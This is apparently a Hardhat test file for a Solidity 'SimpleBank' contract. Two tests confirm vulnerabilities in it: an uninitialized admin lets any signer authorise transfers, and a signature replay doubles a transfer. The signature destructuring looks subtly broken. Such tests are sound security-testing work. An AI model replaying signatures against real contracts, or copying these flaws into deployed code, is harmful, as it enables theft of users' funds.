const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("SimpleBank", function () {
  let simpleBank, admin, user1, user2;

  beforeEach(async function () {
    [admin, user1, user2] = await ethers.getSigners();
    const SimpleBank = await ethers.getContractFactory("SimpleBank");
    simpleBank = await SimpleBank.deploy();
    await simpleBank.deployed();
  });

  describe("Uninitialized Admin", function () {
    it("should allow unauthorized transfers when admin is uninitialized", async function () {
      // Check that the admin is not initialized
      expect(await simpleBank.connect(user1).getBalance(user2.address)).to.equal(0);

      const transferAmount = 100;
      const hash = ethers.utils.solidityKeccak256(
        ["address", "uint256"],
        [user2.address, transferAmount]
      );
      const { v, r, s } = await user1.signMessage(ethers.utils.arrayify(hash));

      await expect(
        simpleBank.connect(user1).transfer(user2.address, transferAmount, hash, v, r, s)
      ).to.not.be.reverted;

      // Check the balance of user2
      expect(await simpleBank.getBalance(user2.address)).to.equal(transferAmount);
    });
  });

  describe("Signature Replay Attack", function () {
    it("should allow replay of the same signature", async function () {
      // Perform a valid transfer
      const transferAmount = 100;
      const hash = ethers.utils.solidityKeccak256(
        ["address", "uint256"],
        [user2.address, transferAmount]
      );
      const { v, r, s } = await admin.signMessage(ethers.utils.arrayify(hash));

      await expect(
        simpleBank.connect(admin).transfer(user2.address, transferAmount, hash, v, r, s)
      ).to.not.be.reverted;

      // Replay the same signature
      await expect(
        simpleBank.connect(user1).transfer(user2.address, transferAmount, hash, v, r, s)
      ).to.not.be.reverted;

      // Check that the balance of user2 reflects both transfers
      expect(await simpleBank.getBalance(user2.address)).to.equal(transferAmount * 2);
    });
  });
});